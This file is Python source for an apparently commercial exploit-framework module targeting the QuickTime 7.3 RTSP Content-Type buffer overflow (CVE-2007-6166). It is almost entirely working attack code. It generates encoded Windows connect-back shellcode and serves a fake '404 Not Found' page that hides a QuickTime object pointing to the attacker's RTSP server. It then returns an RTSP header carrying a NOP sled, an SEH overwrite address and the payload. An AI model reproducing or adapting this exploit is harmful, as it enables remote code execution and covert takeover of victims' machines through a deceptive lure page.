#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

import socket
from exploitutils import *
from encoder import xorencoder
from shellcode import shellcodeGenerator, win32shell 

from ExploitTypes.localexploit import LocalExploit
from libs.spkproxy import header, body


NAME="QuickTime 7.3 RTSP Buffer Overflow"
DESCRIPTION="A misdesign in the RTSP parser allows arbitrary execution using the Content-Type header"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Apple"
DOCUMENTATION["Repeatability"]="Infinite (client side - no crash)"
DOCUMENTATION["Date public"] = "11/23/2007"
DOCUMENTATION["CVE Name"] = "CVE-2007-6166"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6166"
DOCUMENTATION['CVSS'] = 9.3

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP" ]

NOTES="""
It needs to bind to port 554 for RTSP and some user chosen port for HTTP, so it can't be used through our httpserver.

To test from Commandline (it needs fromcreatethread)
     bash-3.00$ ./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
     bash-3.00$ exploits/qt73_rtsp/qt73_rtsp.py -l 192.168.1.1 -d 5555

     We need to bind port 554 (try it as root)

"""

CHANGELOG="""

"""

DEBUGNOTES="""
An overflow into the RTSP parser allows us to overwrite the stack and point the SEH arbitrary.

Sequence:
          memcpy(stack, header_value, strlen(header_value))
          overwrite the SEH with a quicktime lib address that does an: ADD ESP,68 / RETN and bingo, we are in the middle of our buffer.

"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)

        self.port=80 #HTTP port
        self.rtspport=554 #RTSP port
        self.listeners = {}

        # force engine to use hand selected callback interface .. can't use autofind
        self.autoFind = False

        self.badstring="\x00"
        self.setVersions()
        self.version=1
        self.name=NAME        
        self.listenerArgsDict["fromcreatethread"]=1
        self.use_local_interface = False
        self.subesp=1000

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows All Versions",None,None,None,None)

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]

    def createShellcode(self):
        sc=shellcodeGenerator.win32()                                                                                        
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect",{"port":self.callback.port,"ipaddress":self.callback.ip})                                                              
        sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("TerminateThread",None)

        rawshellcode=sc.get()

        print "[!] RAW Shellcode len: %d bytes" % len(rawshellcode)

        #then do a xor enconding using the real badstring
        encoder = xorencoder.simpleXOR()
        encoder.setbadstring(self.badstring)
        encoder.find_key(rawshellcode)
        self.shellcode = encoder.encode(rawshellcode)

        print "[!] Shellcode len: %d bytes" % len(self.shellcode)

        if not len(self.shellcode):
            return None

        return self.shellcode

    def getargs(self):
        self.getarg("port")
        self.getarg("rtspport")
        self.localhost=self.argsDict.get("localhost","0.0.0.0")
        self.bindip=self.argsDict.get("bindip","0.0.0.0")
        return

    def listen(self, port):
        """ start a listener in a given port """
        self.getargs()
        s=self.gettcplistener(port, self.bindip)

        if not s:
            if port < 1024:
                self.log("Cannot listen on port %d - perhaps we need to be root or that port is already bound? " \
                         "you can try to bind to a higher port" % port)
            else:
                self.log("Cannot listen on port %d - perhaps that port is already bound?" % port)
            return 0
        s.set_timeout(5)

        self.listeners[port]=s
        return s 

    def accept(self, s, handler ):
        """
        Try to accept one connection
        returns true if we found one
        s=socket / handler=function to handle a conexion
        """

        #we loop on this
        if s==None:
            return
        try:
            infd,addr=s.accept()
        except timeoutsocket.Timeout:
            #self.log("Timed out - no accept yet")
            return 
        if infd==-1:
            return

        #else we have an infd
        handler(infd)

        return True #handled connection

    def run(self):
        self.getargs()

        #listen for the web
        self.log("Listening on host (WEB) %s:%d"%(self.localhost,self.port))        
        s=self.listen(self.port)
        if not s:
            self.log("Failed to listen - not running")
            return 0

        #listen for the RTSP
        self.log("Listening on host (RTSP) %s:%d"%(self.localhost,self.rtspport))
        s=self.listen(self.rtspport)
        if not s:
            self.log("Failed to listen - not running")
            return 0

        #we can do this without thread because the flow is sequencial: web -> rtsp -> shell
        while 1:
            if self.state==self.HALT:
                #close all the listeners
                for so in self.listeners.values():
                    so.close()
                break

            #also handles any incoming connections
            self.accept(self.listeners[self.port], self.handle_web)
            self.accept(self.listeners[self.rtspport], self.handle_rtsp)

        # reached when user chooses to halt webserver

        self.setInfo("%s on %s:%d - done (success!)"%(NAME,self.bindip,self.port))
        return 1

    def handle_rtsp(self, infd): 
        """
        handle a rtsp connection
        """
        self.log("Handling RTSP connection")
        clientheader=header(state="SERVER")
        ret=clientheader.readdata(infd)
        clientbody=body()

        self.log("Creating exploit response")

        servheader,servbody=self.rtsp_makesploit(clientheader,clientbody)

        self.log("Responding")

        bodydata="".join(servbody.data)

        #the order of the header members it's important here, so I don't use the header() class

        response=""
        response+="%s %s %s\r\n"%(servheader["version"],servheader["status"],servheader["msg"])

        for tuple in servheader["headers"]:
            if tuple[0] not in [ "Content-Length", "Content-length"]:
                response+="%s: %s\r\n" % (tuple[0], tuple[1])

        self.log("Sending header data of %d bytes"%len(response))

        response+="Content-Length: "+str(len(bodydata))+"\r\n"
        response+="\r\n"
        response+="".join(bodydata)

        self.log("Total response length is %d bytes"%len(response))
        try:
            infd.sendall(response)

        except socket.error:
            self.log("Connection closed by peer")

        self.log("Response sent")
        infd.close()
        return 

    def rtsp_makesploit(self,clientheader,clientbody):
        """
        returns serverheader,serverbody
        """

        if self.createShellcode() == None:
            return False

        h={}
        b=body()

        h["version"] = "RTSP/1.0"
        h["status"] = "200"
        h["msg"] = "OK"
        h["headers"] = []

        h["headers"].append(("CSeq", "1"))
        h["headers"].append(("Content-Type", "\x90" * 0x3e3 + "\x31\x32\x86\x66" + "\x90" * 204096 + self.shellcode))

        #66863231 = ADD ESP,68 / RETN

        b.setBody("WTF\r\n")
        return h, b

    def handle_web(self, infd): 
        """
        handle a web connection
        """
        self.log("Handling WEB connection")
        clientheader=header(state="SERVER")
        ret=clientheader.readdata(infd)
        clientbody=body()

        self.log("Creating exploit response")

        servheader,servbody=self.web_makesploit(clientheader,clientbody)

        self.log("Responding")

        bodydata="".join(servbody.data)

        response=""
        response+="%s %s %s\r\n"%(servheader.version,servheader.status,servheader.msg)
        for akey in servheader.headerValuesDict.keys():
            if akey not in [ "Content-Length", "Content-length"]:
                response+=servheader.grabHeader(akey)
        self.log("Sending header data of %d bytes"%len(response))
        response+="Content-Length: "+str(len(bodydata))+"\r\n"
        response+="\r\n"
        response+="".join(bodydata)

        self.log("Total response length is %d bytes"%len(response))
        try:
            infd.sendall(response)

        except socket.error:
            self.log("Connection closed by peer")

        self.log("Response sent")
        infd.close()
        return 

    def web_makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """

        #make the HTML response page
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        user_agent=clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s"%user_agent)
        if user_agent.count("MSIE")==0 and user_agent.count("Firefox")==0:
            self.log("Non IE browser connected - returning None")
            return None,None

        #send the exploit
        self.log("Sending the Quicktime 7.3 RTSP attack html file")
        sploitstring=self.makefile()

        if not sploitstring:
            return None,None

        b.setBody(sploitstring)

        return h,b

    def makefile(self):
        """Makes the actual bad html file to trigger the buffer overflow"""

        html="""
            <html>
            <head>
            <title>404 Not Found</title>
            </head><body>
            <h1>Not Found</h1>
            The requested URL / was not found on this server.<p>
            <hr>
<object CLASSID="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="1" height="1" CODEBASE="http://www.apple.com/qtactivex/qtplugin.cab">
<param name="src" value="test.mov">
<param name="qtsrc" value="rtsp://""" + self.callback.ip +":%s"%self.rtspport +"""/test.mov">
<param name="autoplay" value="true">
<param name="loop" value="false">
<param name="controller" value="true">
<embed src="test.mov" qtsrc="rtsp://""" + self.callback.ip +":%s"%self.rtspport + """/test.mov" width="1" height="1" autoplay="true" loop="false" controller="true" pluginspage="http://www.apple.com/quicktime/"></embed>
</object>
            </body>

            </html>
            """

        return html

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

